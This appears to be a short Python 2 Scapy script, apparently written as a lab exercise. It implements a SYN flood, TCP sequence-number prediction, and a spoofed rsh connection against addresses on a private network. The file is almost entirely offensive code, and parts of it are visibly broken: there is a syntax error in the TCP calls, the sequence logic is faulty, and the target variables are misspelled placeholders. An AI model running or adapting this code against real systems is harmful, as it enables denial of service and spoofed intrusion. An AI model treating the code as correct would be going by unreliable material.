from scapy.all import *

def SynFlodo(src, trg):
	for sport in range(1234,65535):
		IPlayer = IP(src=src, dst=trg)
		TCPlayer = TCP(sport=sport, dport=1234)
		pkt = IPlayer / TCPlayer # this will stack up the packet 
		answ = sr1(pkt,verbose=1)
		seqNum = answ.getlayer(TCP)
src = "10.0.2.15"
dst = "10.0.2.8"
SynFlodo(src, dst)


def calSQ(tgt):
	seqNum = 0 
	preNum = 0
	diffSeq = 0
	for i in range(1,5):
		if preNum != 0:
			preNum = seqNum
		pkt = IP(dst=tgt) / TCP()
		ans = sr1(pkt, verbose=0)
		seqNum = ans.getlayer(TCP).seq 
		diffSeq = seqNum - preNum
		print '[+] TCP Seq Difference: ' + str(diffSeq)
	return seqNum + diffSeq

#tgt = '10.0.2.8'
#seq = calSQ(tgt)
#print '[+] sequence number is ' + str(seq)



def spoofConn(src, tgt, seq):
	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=512, 514)
	synPkt = IPlayer / TCPlayer
	send(synPkt)
	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=512, 514,ack=seq)
	ackPkt = IPlayer / TCPlayer
	send(ackPkt)
src = 'slient machine'
dest = 'the taget'
seqNum = 'the spoofed sequence number'